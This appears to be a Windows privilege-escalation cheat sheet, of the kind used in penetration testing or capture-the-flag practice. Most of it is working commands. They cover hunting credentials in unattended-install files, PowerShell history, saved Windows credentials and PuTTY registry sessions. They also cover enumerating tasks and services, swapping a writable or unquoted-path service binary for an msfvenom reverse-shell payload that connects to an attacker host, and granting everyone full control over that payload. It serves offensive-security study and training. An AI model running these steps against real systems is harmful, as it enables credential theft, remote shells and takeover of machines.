## Unattended installation credentials

Check the following files for credentials:
- `C:\Unattend.xml`
- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\Panther\Unattend\Unattend.xml`
- `C:\Windows\system32\sysprep.inf`
- `C:\Windows\system32\sysprep\sysprep.xml`

___

## Powershell history

Search for credentials in the Powershell history using:

```
type %userprofile%\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```

___

## Windows credentials

```
cmdkey /list
```

display a list of saved credentials.

```
runas /savedcred /user:<user> cmd.exe
```

run a command prompt as specific user using saved credentials.

___

## PuTTY credentials

```
reg query HKEY_CURRENT_USER\Software\<user>\PuTTY\Sessions /f "Proxy" /s
```

display ssh credentials from PuTTY.

___

## Tasks and services

```
schtasks
```

display a list of tasks.

```
schtasks /query /tn "<task>" /fo list /v
```

display specific task information.

```
sc query
```

display a list of services.

```
sc qc "<service>"
```

display specific service configuration.

```
icacls <file>
```

check file permission.

_check for writable files or file path without quotes and with spaces, and replace executable with payload._

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f <format> -o <filename>
```

generate payload _(format `exe` or `exe-service`)_.

```
icacls <file> /grant Everyone:F
```

update payload permission.